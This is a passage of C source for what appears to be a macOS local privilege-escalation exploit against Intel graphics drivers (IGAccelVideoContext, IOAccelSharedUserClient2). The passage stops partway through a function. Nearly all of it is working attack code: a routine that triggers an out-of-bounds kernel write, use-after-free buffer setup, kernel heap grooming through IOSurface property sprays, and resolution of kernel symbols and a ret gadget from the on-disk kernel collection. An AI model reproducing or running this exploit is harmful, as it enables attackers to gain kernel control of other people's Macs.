#include "eop_common.h"

#ifdef FULLCHAIN
#include "../fullchain.h"
#else
#define GLOB
#define CSTR(x) x
#endif

#include "kernel_sc.h"
#include "kernel_sc_imports.h"

// constants for binary serialization
enum {
	kOSSerializeDictionary   = 0x01000000,
	kOSSerializeArray        = 0x02000000,
	kOSSerializeSet          = 0x03000000,
	kOSSerializeNumber       = 0x04000000,
	kOSSerializeSymbol       = 0x08000000,
	kOSSerializeString       = 0x09000000,
	kOSSerializeData         = 0x0a000000,
	kOSSerializeBoolean      = 0x0b000000,
	kOSSerializeObject       = 0x0c000000,
	kOSSerializeTypeMask     = 0x7F000000,
	kOSSerializeDataMask     = 0x00FFFFFF,
	kOSSerializeEndCollection = 0x80000000,
    kOSSerializeBinarySignature = 0xd3,
};

#define die(s, ...) do { printf("(errno %d) " s, errno, ##__VA_ARGS__); while(1) sleep(1); } while(0)

#define kIGAccelVideoContextMedia 0x101
#define kIGAccelVideoContextMain 0x100
#define kIGAccelCommandQueue 8
#define kIOAccelSharedUserClient2 6
#define kSubmitDataBuffers 2
#define kGetDataBuffer 3
#define kCreateResource 0
#define kDeleteResource 1
#define kCreateShmem 7
#define kDeleteShmem 8

// selectors for IOSurfaceRootUserClient
#define kCreateSurface 0
#define kDeleteSurface 1
#define kSurfaceSetValue 9
#define kSurfaceGetValue 10
#define kSurfaceRemValue 11

// selectors for IGAccelCommandQueue
#define kSetNotificationPort 0
#define kSubmitCommandBuffers 1
struct submit_entry {
    unsigned int kcmd_shmid;
    unsigned int cmd_shmid;
    unsigned long unk0;
    unsigned long unk1;
};
struct sIOAccelCommandQueueSubmitArgs {
    unsigned int unused;
    unsigned int count;
    struct submit_entry ents[1];
};

struct rsrc_list_ent {
    unsigned int ids[18];
    unsigned short flags[7];
    unsigned short count;
};
struct rsrc_list_hdr {
    unsigned int d0;
    unsigned int d4;
    unsigned int start;
    unsigned int size;
    unsigned int n_total_ents;
    unsigned int n_ents;
    struct rsrc_list_ent ents[0];
};
struct shmem {
    void* base;
    unsigned int sz;
    unsigned int id;
};

struct OSObject_vtbl {
    char gap0[0x48];
    unsigned long taggedRetain;
    unsigned long taggedRelease;
};
struct OSSerializer {
    unsigned long vtable;
    int retainCount;
    unsigned int unk;
    unsigned long target;
    unsigned long ref;
    unsigned long callback;
};
struct IOAccelContextGetDataBufferIn {
    unsigned int dbclass;
    unsigned int desired_sz;
};
struct IOAccelContextGetDataBufferOut {
    unsigned long addr;
    unsigned long size;
    unsigned long gpu_addr;
    unsigned long shared_ro;
    unsigned long shared_rw;
    unsigned int rsrc_id;
    unsigned int d2c;
};
struct IOAccelContextSubmitDataBuffersIn {
    unsigned int d0;
    unsigned int num_dbclasses;
    unsigned long buflens[16];
};
struct IOAccelContextSubmitDataBuffersOut {
    unsigned long q0;
    unsigned long q8;
    unsigned long q10;
    struct IOAccelContextGetDataBufferOut outs[16];
};
struct IOAccelNewResourceArgs {
    unsigned int type;
    unsigned int cache_mode;
    unsigned short plane_width;
    unsigned short plane_height;
    unsigned short short0;
    unsigned short short1;
    unsigned long q10;
    unsigned long plane_bytes_per_row;
    unsigned char some_count;
    unsigned char plane_count;
    unsigned char other_count;
    unsigned char plane_elem_width;
    unsigned int flags;
    unsigned long q28;
    unsigned long q30;
    unsigned long q38;
    unsigned long q40;
    unsigned long q48;
    unsigned long q50;
    unsigned long wire_down_sz;
    unsigned int parent_id;
    unsigned int d64;
    unsigned char data[0xe60];
};
struct IOAccelNewResourceReturnData {
    unsigned long q0;
    unsigned long map;
    unsigned long shared_ro;
    unsigned long shared_rw;
    unsigned long q20;
    unsigned long resident_size;
    unsigned long global_id;
    unsigned long q38;
    unsigned long q40;
    unsigned long protOpts;
    unsigned long q50;
};
#define RSRCID(rsrc) (*(unsigned int*)((rsrc)->shared_ro+0x100))

#define SKL 7000
#define KBL 8000
#define ICL 9000

GLOB io_service_t accel_svc;
GLOB int driver_version;
GLOB io_connect_t vidctx_main, vidctx_main2, shared_client;
GLOB struct IOAccelContextGetDataBufferOut dbuf0, uaf_dbuf;
GLOB unsigned long kdbuf0;
GLOB mach_vm_address_t sideband, sideband2;
GLOB mach_vm_size_t sideband_sz, sideband2_sz;
GLOB struct IOAccelNewResourceReturnData parent_rsrc;
GLOB unsigned int parent_id;
GLOB unsigned long gpu_addr;
GLOB void* bigmem;
GLOB io_connect_t cmdq;
GLOB struct shmem cmd_shm, kcmd_shm;
GLOB IONotificationPortRef notifi_ref;

#define MACH_MSG_MAX 0x2ffffb4
#define MAX_TRAILER_SZ 0x44
#define MACH_MSG_KSZ(usz) ((usz)+0x4c+4*(((usz)-0x1c)/0xc))
#define MACH_MSG_USZ(ksz) (((3*(ksz)-0xc8)/4+3)&~3)
#define DESC_COUNT(msg) (((mach_msg_base_t*)(msg))->body.msgh_descriptor_count)
#define PORT_DESC(msg) ((mach_msg_port_descriptor_t*)((mach_msg_base_t*)(msg)+1))
GLOB mach_msg_header_t* g_msg;
GLOB mach_port_t port1, port2;
GLOB mach_port_t corpse;

GLOB io_service_t sroot_svc;
GLOB io_connect_t sroot_client;
GLOB unsigned int surf_id;
#define kIOSurfaceRootUserClient 0

#define KERN_PTR(x) (((x)>>40)==0xffffff)

GLOB void* kfile;
GLOB long kfile_sz;
GLOB char* kstrtab;
GLOB struct nlist_64* ksymtab;
GLOB unsigned int knumsyms;
GLOB unsigned long kernel_slide;
GLOB unsigned long ret_gadg;

void parse_kernel_macho() {
    int fd = open(CSTR("/System/Library/KernelCollections/BootKernelExtensions.kc"), O_RDONLY);
    if (fd < 0)
        die("unable to open kernel file to find symbol offsets\n");
    kfile_sz = lseek(fd, 0, SEEK_END);
    if (kfile_sz == -1)
        die("unable to seek to end of kernel file\n");
    kfile = mmap(0, kfile_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (kfile == MAP_FAILED)
        die("couldnt mmap kernel file\n");
    close(fd);

    struct mach_header_64* hdr = kfile+0x10000;
    struct load_command* cmds = (void*)(hdr+1);
    struct load_command* cmd = cmds;

    // get symtab/strtab
    for (int i = 0; i < hdr->ncmds; i++, cmd = (void*)cmd+cmd->cmdsize)
        if (cmd->cmd == LC_SYMTAB) {
            struct symtab_command* symtab = (void*)cmd;
            knumsyms = symtab->nsyms;
            ksymtab = kfile+symtab->symoff;
            kstrtab = kfile+symtab->stroff;
            break;
        }
    if (!ksymtab)
        die("couldnt find symtab/strtab\n");

    // find text section
    cmd = cmds;
    unsigned char* text = 0;
    unsigned long textaddr = 0;
    unsigned long textsz = 0;
    for (int i = 0; i < hdr->ncmds && !textaddr; i++, cmd = (void*)cmd+cmd->cmdsize)
        if (cmd->cmd == LC_SEGMENT_64) {
            struct segment_command_64* seg = (void*)cmd;
            if (seg->initprot == (PROT_READ|PROT_EXEC)) {
                struct section_64* sec = (void*)(seg+1);
                for (int i = 0; i < seg->nsects; i++, sec++)
                    if (!strcmp(sec->segname, CSTR("__TEXT")) && !strcmp(sec->sectname, CSTR("__text"))) {
                        text = kfile+sec->offset;
                        textaddr = sec->addr;
                        textsz = sec->size;
                        break;
                    }
            }
        }
    if (!text)
        die("couldnt find text section\n");

    // search for ret gadget
    unsigned char* p = memchr(text, 0xc3, textsz);
    if (!p)
        die("couldnt find ret gadget\n");
    ret_gadg = textaddr+p-text;
}
unsigned long find_sym(char* name) {
    // iterate over symbols in symtab
    for (unsigned int i = 0; i < knumsyms; i++) {
        char* sym = &kstrtab[ksymtab[i].n_un.n_strx];
        if (sym[0] == '_' && !strcmp(sym+1, name))
            return ksymtab[i].n_value + kernel_slide;
    }
    die("unable to resolve kernel symbol %s\n", name);
    return 0;
}

io_connect_t open_ioaccel_svc() {
    io_connect_t conn = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceNameMatching(CSTR("IntelAccelerator")));
    if (conn == MACH_PORT_NULL)
        die("couldnt find service\n");

    // identify which processor we're on
    CFStringRef cf_bundle_ident = CFStringCreateWithCString(kCFAllocatorDefault, CSTR("CFBundleIdentifier"), kCFStringEncodingUTF8);
    CFStringRef ident_ref = IORegistryEntryCreateCFProperty(conn, cf_bundle_ident, kCFAllocatorDefault, 0);
    if (!ident_ref)
        die("couldnt obtain CFBundleIdentifier property\n");
    if (CFGetTypeID(ident_ref) != CFStringGetTypeID())
        die("identifier not a string\n");
    char ident_str[0x100];
    memset(&ident_str, 0, sizeof(ident_str));
    if (!CFStringGetCString(ident_ref, ident_str, sizeof(ident_str), kCFStringEncodingUTF8))
        die("couldnt get identifier c-string\n");
    if (!strcmp(ident_str, CSTR("com.apple.driver.AppleIntelICLGraphics")))
        driver_version = ICL;
    else if (!strcmp(ident_str, CSTR("com.apple.driver.AppleIntelKBLGraphics")))
       driver_version = KBL;
    else if (!strcmp(ident_str, CSTR("com.apple.driver.AppleIntelSKLGraphics")))
       driver_version = SKL;
    else
        die("unknown graphics driver: %s\n", ident_str);
    CFRelease(cf_bundle_ident);
    CFRelease(ident_ref);

    return conn;
}
io_connect_t open_vidctx() {
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t err = IOServiceOpen(accel_svc, mach_task_self(), kIGAccelVideoContextMain, &conn);
    if (err != KERN_SUCCESS)
        die("unable to open video context media user client: 0x%x\n", err);
    return conn;
}
io_connect_t open_shared_client() {
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t err = IOServiceOpen(accel_svc, mach_task_self(), kIOAccelSharedUserClient2, &conn);
    if (err != KERN_SUCCESS)
        die("unable to open shared user client: 0x%x\n", err);
    return conn;
}
void connect_client(io_connect_t a, io_connect_t b) {
    kern_return_t err = IOConnectAddClient(a, b);
    if (err != KERN_SUCCESS)
        die("couldnt connect clients: 0x%x\n", err);
}
io_connect_t open_cmdq() {
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t err = IOServiceOpen(accel_svc, mach_task_self(), kIGAccelCommandQueue, &conn);
    if (err != KERN_SUCCESS)
        die("couldnt create command queue: 0x%x\n", err);
    return conn;
}
void create_shmem(unsigned long sz, struct shmem* out) {
    unsigned long long msz = sz;
    unsigned long outsz = sizeof(*out);
    kern_return_t err = IOConnectCallMethod(shared_client, kCreateShmem, &msz, 1, 0, 0, 0, 0, out, &outsz);
    if (err != KERN_SUCCESS)
        die("couldnt create shmem: 0x%x\n", err);
}
void cmdq_setup() {
    cmdq = open_cmdq();
    connect_client(cmdq, shared_client);
    notifi_ref = IONotificationPortCreate(kIOMasterPortDefault);
    if (!notifi_ref)
        die("couldnt create notification port\n");
    mach_port_t notifi_port = IONotificationPortGetMachPort(notifi_ref);
    struct {
        mach_port_t port;
        void (*fptr)();
        unsigned long qq;
    } ref = {0};
    ref.port = notifi_port;
    kern_return_t err = IOConnectCallAsyncScalarMethod(cmdq, kSetNotificationPort, notifi_port, (void*)&ref, 1, 0, 0, 0, 0);
    if (err != KERN_SUCCESS)
        die("couldnt set notification port: 0x%x\n", err);
    create_shmem(0x1000, &cmd_shm);
    create_shmem(0x1000, &kcmd_shm);
}
kern_return_t delete_resource(unsigned int id) {
    unsigned long long m_id = id;
    return IOConnectCallScalarMethod(shared_client, kDeleteResource, &m_id, 1, 0, 0);
}
unsigned int create_resource(unsigned int typ, unsigned long sz, unsigned long val, unsigned int parent_id, struct IOAccelNewResourceReturnData* out) {
    struct IOAccelNewResourceArgs rsrc_args = {0};
    rsrc_args.type = typ;
    rsrc_args.some_count = 1;
    rsrc_args.wire_down_sz = sz;
    rsrc_args.plane_bytes_per_row = 1; // needs to be nonzero for bind_resource
    rsrc_args.parent_id = parent_id;
    if (parent_id)
        rsrc_args.flags |= 0x800;
    rsrc_args.q40 = val;
    unsigned long outsz = sizeof(*out);
    kern_return_t err = IOConnectCallMethod(shared_client, kCreateResource, 0, 0, &rsrc_args, sizeof(rsrc_args), 0, 0, out, &outsz);
    if (err != KERN_SUCCESS)
        die("unable to create resource: 0x%x\n", err);
    return RSRCID(out);
};

kern_return_t submit_data_buffers(io_connect_t ctx) {
    struct IOAccelContextSubmitDataBuffersIn submit_arg = {
        0, 0, {0}
    };
    struct IOAccelContextSubmitDataBuffersOut submit_out = {0};
    unsigned long submit_out_sz = sizeof(submit_out);
    return IOConnectCallStructMethod(ctx, kSubmitDataBuffers, &submit_arg, sizeof(submit_arg), &submit_out, &submit_out_sz);
}
unsigned int create_iosurface() {
    static GLOB unsigned int props[] = {
        kOSSerializeBinarySignature,
        kOSSerializeDictionary | kOSSerializeEndCollection | 1,
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // IOSurfaceAllocSize
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    unsigned int out[0xf60/4];
    unsigned long outsz = sizeof(out);
    kern_return_t err = IOConnectCallStructMethod(sroot_client, kCreateSurface, props, sizeof(props), out, &outsz);
    if (err != KERN_SUCCESS)
        die("couldnt create surface: 0x%x\n", err);
    return out[6];
}
kern_return_t delete_surface(unsigned int id) {
    unsigned long long m_id = id;
    return IOConnectCallScalarMethod(sroot_client, kDeleteSurface, &m_id, 1, 0, 0);
}
kern_return_t set_surface_val(void* val, unsigned long sz) {
    unsigned int setval_out = 0;
    unsigned long tmpsz = sizeof(setval_out);
    return IOConnectCallStructMethod(sroot_client, kSurfaceSetValue, val, sz, &setval_out, &tmpsz);
}
kern_return_t rem_surface_val(void* params, unsigned long params_sz) {
    unsigned int out;
    unsigned long outsz = sizeof(out);
    return IOConnectCallStructMethod(sroot_client, kSurfaceRemValue, params, params_sz, &out, &outsz);
}
kern_return_t get_surface_val(char* key) {
    unsigned int alloc_sz = ((strlen(key)+4)&~3)+4*2;
    unsigned int* pl = malloc(alloc_sz);
    memset(pl, 0, alloc_sz);
    pl[0] = surf_id;
    pl[1] = 0;
    strcpy((char*)(pl+2), key);
    char out[0x10];
    unsigned long outsz = sizeof(out);
    return IOConnectCallStructMethod(sroot_client, kSurfaceGetValue, pl, alloc_sz, out, &outsz);
}

void vidctx_setup() {
    kern_return_t err;

    accel_svc = open_ioaccel_svc();
    printf("IntelAccelerator: 0x%x\n", accel_svc);
    vidctx_main = open_vidctx();
    vidctx_main2 = open_vidctx();
    printf("IGAccelVideoContextMain: 0x%x 0x%x\n", vidctx_main, vidctx_main2);
    shared_client = open_shared_client();
    printf("IOAccelSharedUserClient2: 0x%x\n", shared_client);

    // connect vidctx to shared client to "start" it
    connect_client(vidctx_main, shared_client);
    connect_client(vidctx_main2, shared_client);

    // create a parent resource
    parent_id = create_resource(0, 0x1000, 0, 0, &parent_rsrc);
    printf("parent: 0x%lx 0x%x\n", parent_rsrc.map, parent_id);

    // for some reason it doesnt process sideband buffers the first time, just unsets a byte
    // that allows processing the second time
    // this also allocs dbuf0 (but it is lazily mapped into kernelspace)
    struct IOAccelContextSubmitDataBuffersIn submit_arg = {
        0, 0, {1ul<<63}
    };
    struct IOAccelContextSubmitDataBuffersOut submit_out = {0};
    unsigned long tmp_sz = sizeof(submit_out);
    err = IOConnectCallStructMethod(vidctx_main, kSubmitDataBuffers, &submit_arg, sizeof(submit_arg), &submit_out, &tmp_sz);
    if (err != KERN_SUCCESS)
        die("couldnt do initial submit_data_buffers: 0x%x\n", err);
    dbuf0 = submit_out.outs[0];
    printf("dbuf: 0x%lx 0x%lx 0x%x\n", dbuf0.addr, dbuf0.size, dbuf0.rsrc_id);
    err = IOConnectCallStructMethod(vidctx_main2, kSubmitDataBuffers, &submit_arg, sizeof(submit_arg), &submit_out, &tmp_sz);
    if (err != KERN_SUCCESS)
        die("couldnt do initial submit_data_buffers for ctx2: 0x%x\n", err);
    uaf_dbuf = submit_out.outs[0];
    printf("uaf_dbuf: 0x%lx 0x%lx 0x%x\n", uaf_dbuf.addr, uaf_dbuf.size, uaf_dbuf.rsrc_id);

    // map sideband buffer
    err = IOConnectMapMemory(vidctx_main, 0, mach_task_self(), &sideband, &sideband_sz, kIOMapAnywhere);
    if (err != KERN_SUCCESS)
        die("couldnt map sideband buffer: 0x%x\n", err);
    printf("sideband: 0x%llx 0x%llx\n", sideband, sideband_sz);
    err = IOConnectMapMemory(vidctx_main2, 0, mach_task_self(), &sideband2, &sideband2_sz, kIOMapAnywhere);
    if (err != KERN_SUCCESS)
        die("couldnt map sideband buffer 2: 0x%x\n", err);
    printf("sideband2: 0x%llx 0x%llx\n", sideband2, sideband2_sz);
}

void cmd_write64(io_connect_t ctx, unsigned int dbuf_id, mach_vm_address_t sideband, unsigned int idx, unsigned long val) {
    // create the resource to bind
    struct IOAccelNewResourceReturnData binder;
    unsigned int binder_id = create_resource(0, 0x1000, val-gpu_addr, parent_id, &binder);

    unsigned int* sb = (void*)sideband+16;
    unsigned int off = idx&~0x1ff;
    idx &= 0x1ff;

    // prepend a token to bind dbuf0
    ((unsigned short*)sb)[0] = 0x0; // token_id
    ((unsigned short*)sb)[1] = 3; // token_size
    sb[1] = 0; // db0_off
    sb[2] = dbuf_id; // rsrc id
    sb = sb+((unsigned short*)sb)[1];

    // trigger vuln
    ((unsigned short*)sb)[0] = 0x8300; // token_id
    ((unsigned short*)sb)[1] = 9; // token_size
    sb[1] = off/4; // db0_off
    sb[3] = 0; // resource id (none) in process_token_VPHAL
    unsigned int* cmd = sb+5;
    cmd[0] = 1 | (binder_id<<16) | ((idx/4)<<3);
    cmd[1] = 0; // offset added to gpu_addr lo32
    cmd[2] = 0; // signal end

    submit_data_buffers(ctx);

    delete_resource(binder_id);
}
void oob_write32(unsigned int val) {
    cmd_write64(vidctx_main, dbuf0.rsrc_id, sideband, dbuf0.size-4, (unsigned long)val<<32);
}
void uaf_write64(unsigned int off, unsigned long val) {
    cmd_write64(vidctx_main2, uaf_dbuf.rsrc_id, sideband2, uaf_dbuf.size-0x1000+off, val);
}

void alloc_dbuf0() {
    // this will alloc and then release dbuf0's buffer
    // however as long as no other allocs cause it to "gc" it's fine
    // alloc big rsrc to ensure new map
    // then release and alloc pad rsrc, then dbuf0
    // finally reset hint to original map
    struct IOAccelNewResourceReturnData big_rsrc = {0}, pad_rsrc = {0}, reset_rsrc = {0};
    unsigned int big_id = create_resource(0, 0x20000000, 0, 0, &big_rsrc);
    unsigned int pad_id = create_resource(0, 0x20000000-dbuf0.size, 0, 0, &pad_rsrc);
    unsigned int reset_id = create_resource(0, 0x1000, 0, 0, &reset_rsrc);

    struct sIOAccelCommandQueueSubmitArgs submit_args = {0};
    submit_args.count = 1;
    submit_args.ents[0].kcmd_shmid = kcmd_shm.id;
    submit_args.ents[0].cmd_shmid = cmd_shm.id;
    unsigned int* kcmd = kcmd_shm.base;
    kcmd[0] = 0x10000;
    kcmd[1] = 0x1c;
    kcmd[3] = 0; // rsrc idx
    kcmd[6] = 0; // no prev buffer
    kcmd[4] = 0; // shmem offset
    kcmd[2] = 0; // other shmem offset
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10000;
    kcmd[1] = 0x1c;
    kcmd[3] = 1;
    kcmd[6] = 0;
    kcmd[4] = 0;
    kcmd[2] = 0;
    kcmd = (void*)kcmd+kcmd[1];;
    if (driver_version == ICL) {
        kcmd[0] = 0x10011;
        kcmd[1] = 0x14;
        kcmd[3] = 2; // rsrc idx
        kcmd[2] = 0; // shmem offset
        kcmd[4] = 0;
    }
    else {
        kcmd[0] = 0x10012;
        kcmd[1] = 0x18;
        kcmd[3] = 2; // rsrc idx
        kcmd[2] = 0; // shmem offset
        kcmd[4] = kcmd[5] = 0;
    }
    kcmd = (void*)kcmd+kcmd[1];;
    if (driver_version == ICL) {
        kcmd[0] = 0x10012;
        kcmd[1] = 0x14;
        kcmd[3] = 3;
        kcmd[2] = 0;
        kcmd[4] = 0;
    }
    else {
        kcmd[0] = 0x10013;
        kcmd[1] = 0x18;
        kcmd[3] = 3;
        kcmd[2] = 0;
        kcmd[4] = kcmd[5] = 0;
    }
    kcmd = (void*)kcmd+kcmd[1];;
    unsigned int* cmd = cmd_shm.base;
    cmd[3] = 0x100; // total size
    cmd[2] = 1; // count
    struct rsrc_list_hdr* rlist = (void*)&cmd[4];
    rlist->start = 0; // start in kcmd
    rlist->n_ents = 1;
    rlist->n_total_ents = 4;
    rlist->ents[0].count = 4;
    rlist->ents[0].ids[0] = big_id;
    rlist->ents[0].ids[1] = pad_id;
    rlist->ents[0].ids[2] = dbuf0.rsrc_id;
    rlist->ents[0].ids[3] = reset_id;
    rlist->ents[0].flags[0] = 4; // pass some check
    rlist->ents[0].flags[1] = 4;
    rlist->ents[0].flags[2] = 4;
    rlist->ents[0].flags[3] = 4;
    rlist->size = (void*)kcmd-kcmd_shm.base; // size of kcmd opcodes
    IOConnectCallStructMethod(cmdq, kSubmitCommandBuffers, &submit_args, sizeof(submit_args), 0, 0);

    delete_resource(big_id);
    delete_resource(pad_id);
    delete_resource(reset_id);

    cmd_write64(vidctx_main, dbuf0.rsrc_id, sideband, 0, 0);
    gpu_addr = *(unsigned long*)dbuf0.addr;
    printf("parent gpu_addr: 0x%lx\n", gpu_addr);
}

mach_port_t alloc_port() {
    mach_port_t p = MACH_PORT_NULL;
    kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
    if (err != KERN_SUCCESS)
        die("couldnt allocate port: 0x%x\n", err);
    return p;
}

void mach_msg_setup() {
    g_msg = malloc(MACH_MSG_MAX+MAX_TRAILER_SZ);
    if (!g_msg)
        die("couldnt mmap mach msg\n");
    port1 = alloc_port();
    port2 = alloc_port();
    printf("ports: 0x%x 0x%x\n", port1, port2);
}

void iosurface_setup() {
    kern_return_t err;

    sroot_svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceNameMatching(CSTR("IOSurfaceRoot")));
    if (sroot_svc == MACH_PORT_NULL)
        die("couldnt find IOSurfaceRoot service\n");
    printf("IOSurfaceRoot service: 0x%x\n", sroot_svc);
    err = IOServiceOpen(sroot_svc, mach_task_self(), kIOSurfaceRootUserClient, &sroot_client);
    if (err != KERN_SUCCESS)
        die("couldnt open IOSurfaceRootUserClient: 0x%x\n", err);
    printf("IOSurfaceRootUserClient: 0x%x\n", sroot_client);
    surf_id = create_iosurface();
    printf("surface_id: 0x%x\n", surf_id);
}

void send_msg(mach_port_t port, unsigned int sz, unsigned int complx) {
    kern_return_t err;

    memset(g_msg, 0, sizeof(*g_msg));
    g_msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | (complx ? MACH_MSGH_BITS_COMPLEX : 0);
    g_msg->msgh_size = sz;
    g_msg->msgh_remote_port = port;

    err = mach_msg(g_msg, MACH_SEND_MSG, g_msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (err != KERN_SUCCESS)
        die("couldnt send msg: 0x%x\n", err);
}
void recv_msg(mach_port_t port) {
    kern_return_t err;
    err = mach_msg(g_msg, MACH_RCV_MSG, 0, MACH_MSG_MAX+MAX_TRAILER_SZ, port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (err != KERN_SUCCESS)
        die("couldnt receive msg: 0x%x\n", err);
}

void alloc_osarray(unsigned int capacity, char* key, unsigned int ndata) {
    unsigned alloc_sz = ((strlen(key)+4)&~3) + 4*(6+ndata);
    void* pl = malloc(alloc_sz);
    memset(pl, 0, alloc_sz);
    unsigned int* cur = pl;
    *cur++ = surf_id;
    *cur++ = 0;
    *cur++ = kOSSerializeBinarySignature;
    *cur++ = kOSSerializeArray | 2;
    *cur++ = kOSSerializeArray | (capacity/8);
    for (unsigned int i = 0; i < ndata; i++)
        *cur++ = kOSSerializeData | 0 | (i == ndata-1 ? kOSSerializeEndCollection : 0);
    *cur++ = kOSSerializeString | strlen(key) | kOSSerializeEndCollection;
    strcpy((char*)cur, key);
    kern_return_t err = set_surface_val(pl, alloc_sz);
    if (err != KERN_SUCCESS)
        die("couldnt alloc OSArray %s : 0x%x\n", key, err);
}
void free_osarray(char* key) {
    unsigned alloc_sz = ((strlen(key)+4)&~3) + 4*2;
    void* pl = malloc(alloc_sz);
    memset(pl, 0, alloc_sz);
    unsigned int* cur = pl;
    *cur++ = surf_id;
    *cur++ = 0;
    strcpy((char*)cur, key);
    kern_return_t err = rem_surface_val(pl, alloc_sz);
    if (err != KERN_SUCCESS)
        die("couldnt free OSArray %s : 0x%x\n", key, err);
}

void fill_bigmem() {
    bigmem = mmap(0, 0x800000000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (bigmem == MAP_FAILED)
        die("couldnt mmap bigmem\n");
    for (unsigned long i = 0; i < 0x800000000; i+=0x10000)
        *(char*)(bigmem+i) = 0;
}

void fill_kernel_map() {
    char valname[0x40];
    // fill up kernel virtual space
    // we want to make sure there are no 0x801000 holes available
    // first some pre-fillers to fill up holes
    // then more 0x801000 allocations with 0x800000 holes in between
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("prefiller_%u"), i);
        alloc_osarray(0x800000, valname, 1);
    }
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("hole_%u"), i);
        alloc_osarray(0x800000, valname, 1);
        sprintf(valname, CSTR("filler_%u"), i);
        alloc_osarray(0x801000, valname, 1);
    }
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("hole_%u"), i);
        free_osarray(valname);
    }
}

void free_kernel_map_fillers() {
    char valname[0x40];
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("prefiller_%u"), i);
        free_osarray(valname);
    }
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("filler_%u"), i);
        free_osarray(valname);
    }
}

void alloc_corpse() {
    kern_return_t err;
    err = task_generate_corpse(mach_task_self(), &corpse);
    printf("corpse: 0x%x\n", corpse);
    if (err != KERN_SUCCESS)
        die("couldnt gen corpse: 0x%x\n", err);
}

void alloc_uaf_dbuf() {
    // alloc uaf_dbuf at end of new map, after footprint
    // first ref dbuf0 so it doesnt get gc'd
    // alloc big rsrc to ensure new map
    // then release and alloc pad_rsrc, then uaf_dbuf
    // then alloc pad_rsrc2 which will fill space before dbuf0
    // finally reset hint to original map
    struct IOAccelNewResourceReturnData big_rsrc = {0}, pad_rsrc = {0}, pad_rsrc2 = {0}, reset_rsrc = {0};
    unsigned int big_id = create_resource(0, 0x20000000, 0, 0, &big_rsrc);
    unsigned int pad_id = create_resource(0, 0x20000000-uaf_dbuf.size, 0, 0, &pad_rsrc);
    unsigned int pad2_id = create_resource(0, 0x20000000-dbuf0.size, 0, 0, &pad_rsrc2);
    unsigned int reset_id = create_resource(0, 0x1000, 0, 0, &reset_rsrc);

    struct sIOAccelCommandQueueSubmitArgs submit_args = {0};
    submit_args.count = 1;
    submit_args.ents[0].kcmd_shmid = kcmd_shm.id;
    submit_args.ents[0].cmd_shmid = cmd_shm.id;
    unsigned int* kcmd = kcmd_shm.base;
    kcmd[0] = 0x10000;
    kcmd[1] = 0x1c;
    kcmd[3] = 0; // rsrc idx
    kcmd[6] = 0; // no prev buffer
    kcmd[4] = 0; // shmem offset
    kcmd[2] = 0; // other shmem offset
    kcmd = (void*)kcmd+kcmd[1];;
    if (driver_version == ICL) {
        kcmd[0] = 0x10011; // store dbuf0 ref
        kcmd[1] = 0x14;
        kcmd[3] = 0; // rsrc idx
        kcmd[2] = 0; // shmem offset
        kcmd[4] = 0;
    }
    else {
        kcmd[0] = 0x10012; // store dbuf0 ref
        kcmd[1] = 0x18;
        kcmd[3] = 0; // rsrc idx
        kcmd[2] = 0; // shmem offset
        kcmd[4] = kcmd[5] = 0;
    }
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10000; // ref big resource
    kcmd[1] = 0x1c;
    kcmd[3] = 1;
    kcmd[6] = 0;
    kcmd[4] = 0;
    kcmd[2] = 0;
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10000; // release, ref dbuf0
    kcmd[1] = 0x1c;
    kcmd[3] = 0;
    kcmd[6] = 0;
    kcmd[4] = 0;
    kcmd[2] = 0;
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10003; // ref pad, uaf_dbuf, pad2, then reset
    kcmd[1] = 0x20;
    kcmd[5] = 2; // rsrc idx
    kcmd[3] = 3; // 2nd rsrc idx
    kcmd[4] = 4; // 3rd rsrc idx
    kcmd[6] = 5; // 4th rsrc idx
    kcmd[7] = 0; // dont default gpu_addr to 0
    kcmd[2] = 0; // shmem offset
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10003; // release all refs except dbuf0 and uaf_dbuf0 so they are most recently used
    kcmd[1] = 0x20;
    kcmd[5] = kcmd[3] = 0;
    kcmd[4] = kcmd[6] = 3;
    kcmd[7] = 0;
    kcmd[2] = 0;
    kcmd = (void*)kcmd+kcmd[1];;
    unsigned int* cmd = cmd_shm.base;
    cmd[3] = 0x100; // total size
    cmd[2] = 1; // count
    struct rsrc_list_hdr* rlist = (void*)&cmd[4];
    rlist->start = 0; // start in kcmd
    rlist->n_ents = 1;
    rlist->n_total_ents = 6;
    rlist->ents[0].count = 6;
    rlist->ents[0].ids[0] = dbuf0.rsrc_id;
    rlist->ents[0].ids[1] = big_id;
    rlist->ents[0].ids[2] = pad_id;
    rlist->ents[0].ids[3] = uaf_dbuf.rsrc_id;
    rlist->ents[0].ids[4] = pad2_id;
    rlist->ents[0].ids[5] = reset_id;
    rlist->ents[0].flags[0] = 4; // pass some check
    rlist->ents[0].flags[1] = 4;
    rlist->ents[0].flags[2] = 4;
    rlist->ents[0].flags[3] = 4;
    rlist->ents[0].flags[4] = 4;
    rlist->ents[0].flags[5] = 4;
    rlist->size = (void*)kcmd-kcmd_shm.base; // size of kcmd opcodes
